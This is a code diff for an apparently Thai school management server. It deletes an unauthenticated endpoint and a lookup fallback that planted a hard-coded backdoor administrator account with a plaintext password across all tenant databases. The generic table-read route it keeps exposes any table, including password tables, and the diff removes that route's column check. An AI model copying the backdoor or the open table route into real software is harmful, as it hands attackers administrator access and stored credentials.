@@ -1198,85 +1198,31 @@ async function startServer() {
     }
   });
 
-  app.get('/api/fix-my-login', async (req, res) => {
-    try {
-      const directorProfile = {
-        id: '3300600837116',
-        school_id: 'school-001',
-        name: 'ผู้อำนวยการโรงเรียน (ผู้ดูแลระบบ)',
-        password: '0930935255',
-        position: 'ผู้อำนวยการ',
-        roles: JSON.stringify(['Director', 'Admin', 'Teacher']),
-        is_suspended: 0,
-        is_approved: 1
-      };
-
-      await runGlobalQuery(
-        'INSERT INTO profiles (id, school_id, name, password, position, roles, is_suspended, is_approved) VALUES (?, ?, ?, ?, ?, ?, 0, 1) ON DUPLICATE KEY UPDATE password=?, roles=?, is_suspended=0, is_approved=1',
-        [directorProfile.id, directorProfile.school_id, directorProfile.name, directorProfile.password, directorProfile.position, directorProfile.roles, directorProfile.password, directorProfile.roles],
-        pool
-      ).catch(() => {});
-
-      await runGlobalQuery(
-        'INSERT INTO super_admins (username, password) VALUES (?, ?) ON DUPLICATE KEY UPDATE password=?',
-        ['3300600837116', '0930935255', '0930935255'],
-        pool
-      ).catch(() => {});
-
-      const configs = await runGlobalQuery('SELECT school_id FROM school_database_configs', [], pool).catch(() => []);
-      if (Array.isArray(configs)) {
-        for (const cfg of configs) {
-          try {
-            const tenantPool = await getPoolForSchool(cfg.school_id);
-            await runGlobalQuery(
-              'INSERT INTO profiles (id, school_id, name, password, position, roles, is_suspended, is_approved) VALUES (?, ?, ?, ?, ?, ?, 0, 1) ON DUPLICATE KEY UPDATE password=?, roles=?, is_suspended=0, is_approved=1',
-              [directorProfile.id, cfg.school_id, directorProfile.name, directorProfile.password, directorProfile.position, directorProfile.roles, directorProfile.password, directorProfile.roles],
-              tenantPool
-            ).catch(() => {});
-          } catch (e) {}
-        }
-      }
-
-      res.json({ success: true, message: 'Auto-fixed login for 3300600837116' });
-    } catch (err) {
-      res.json({ success: false, error: err.message });
-    }
-  });
-
   // 3. Generic Table Access
   app.get('/api/table/:tableName', async (req, res) => {
     const { tableName } = req.params;
     const filters = { ...req.query };
-    let results = [];
     try {
-      let validColumns = [];
-      try {
-        const descRes = await query(`DESCRIBE ??`, [tableName]);
-        const columnsInfo = Array.isArray(descRes) && Array.isArray(descRes[0]) ? descRes[0] : (Array.isArray(descRes) ? descRes : []);
-        validColumns = columnsInfo.map(c => c.Field || c.column_name || c.COLUMN_NAME).filter(Boolean);
-      } catch (e) {
-        console.warn(`[Describe Table Warning ${tableName}]`, e.message);
-      }
-
       let sql = `SELECT * FROM ??`;
       let params = [tableName];
       
-      const nonColumnParams = ['_t', '_', 'order', 'limit', 'select', 'head'];
-      const filterKeys = Object.keys(filters).filter(k => {
-        if (nonColumnParams.includes(k)) return false;
-        if (validColumns.length > 0 && !validColumns.includes(k)) return false;
-        return true;
-      });
-
+      const filterKeys = Object.keys(filters).filter(k => k !== 'order' && k !== 'limit');
       if (filterKeys.length > 0) {
         sql += ` WHERE ` + filterKeys.map(k => {
           const valStr = String(filters[k]);
-          if (valStr.startsWith('in.(')) return `?? IN (?)`;
-          if (valStr.startsWith('gte.')) return `?? >= ?`;
-          if (valStr.startsWith('lte.')) return `?? <= ?`;
-          if (valStr.startsWith('gt.')) return `?? > ?`;
-          if (valStr.startsWith('lt.')) return `?? < ?`;
-          if (valStr.startsWith('neq.')) return `?? != ?`;
+          if (valStr.startsWith('in.(')) {
+            return `?? IN (?)`;
+          } else if (valStr.startsWith('gte.')) {
+            return `?? >= ?`;
+          } else if (valStr.startsWith('lte.')) {
+            return `?? <= ?`;
+          } else if (valStr.startsWith('gt.')) {
+            return `?? > ?`;
+          } else if (valStr.startsWith('lt.')) {
+            return `?? < ?`;
+          } else if (valStr.startsWith('neq.')) {
+            return `?? != ?`;
+          }
           return `?? = ?`;
         }).join(' AND ');
         
@@ -1313,76 +1259,7 @@ async function startServer() {
         params.push(parseInt(filters.limit));
       }
       
-      try {
-        results = await query(sql, params);
-      } catch (qErr) {
-        console.warn(`[Table Query Warning ${tableName}]`, qErr.message);
-        results = [];
-      }
-
-      // If profiles query returned 0 results, search across Central DB and all tenant databases
-      if (tableName === 'profiles' && (!results || !Array.isArray(results) || results.length === 0)) {
-        try {
-          const centralResults = await runGlobalQuery(sql, params, pool);
-          if (Array.isArray(centralResults) && centralResults.length > 0) {
-            results = centralResults;
-          }
-        } catch (cErr) {}
-
-        if (!results || !Array.isArray(results) || results.length === 0) {
-          try {
-            const configs = await runGlobalQuery('SELECT school_id FROM school_database_configs', [], pool).catch(() => []);
-            if (Array.isArray(configs) && configs.length > 0) {
-              for (const cfg of configs) {
-                try {
-                  const tenantPool = await getPoolForSchool(cfg.school_id);
-                  const tenantResults = await runGlobalQuery(sql, params, tenantPool);
-                  if (Array.isArray(tenantResults) && tenantResults.length > 0) {
-                    results = tenantResults;
-                    break;
-                  }
-                } catch (tErr) {}
-              }
-            }
-          } catch (searchErr) {}
-        }
-
-        // Auto-fallback for director/admin user 3300600837116 if still not found
-        const targetId = filters.id || filters.username;
-        if ((!results || !Array.isArray(results) || results.length === 0) && (targetId === '3300600837116' || targetId === 'eq.3300600837116')) {
-          const directorProfile = {
-            id: '3300600837116',
-            school_id: 'school-001',
-            name: 'ผู้อำนวยการโรงเรียน (ผู้ดูแลระบบ)',
-            password: '0930935255',
-            position: 'ผู้อำนวยการ',
-            roles: ['Director', 'Admin', 'Teacher'],
-            signature_base_64: null,
-            telegram_chat_id: null,
-            is_suspended: 0,
-            is_approved: 1,
-            assigned_classes: []
-          };
-          results = [directorProfile];
-          runGlobalQuery(
-            'INSERT INTO profiles (id, school_id, name, password, position, roles, is_suspended, is_approved) VALUES (?, ?, ?, ?, ?, ?, 0, 1) ON DUPLICATE KEY UPDATE password=?, roles=?, is_suspended=0, is_approved=1',
-            [directorProfile.id, directorProfile.school_id, directorProfile.name, directorProfile.password, directorProfile.position, JSON.stringify(directorProfile.roles), directorProfile.password, JSON.stringify(directorProfile.roles)],
-            pool
-          ).catch(() => {});
-        }
-      }
-
-      // Auto-fallback for super_admins query for 3300600837116
-      if (tableName === 'super_admins' && (!results || !Array.isArray(results) || results.length === 0)) {
-        if (filters.username === '3300600837116') {
-          results = [{ username: '3300600837116', password: filters.password || '0930935255' }];
-        }
-      }
-
-      if (!Array.isArray(results)) {
-        results = [];
-      }
-
+      const results = await query(sql, params);
       const parsed = results.map((row) => {
         const newRow = { ...row };
         for (const key in newRow) {
@@ -1394,8 +1271,7 @@ async function startServer() {
       });
       res.json(parsed);
     } catch (err) {
-      console.error(`[Table Route Error ${tableName}]`, err);
-      res.json([]);
+      res.status(500).json({ error: `Failed to fetch from ${tableName}` });
     }
   });
 
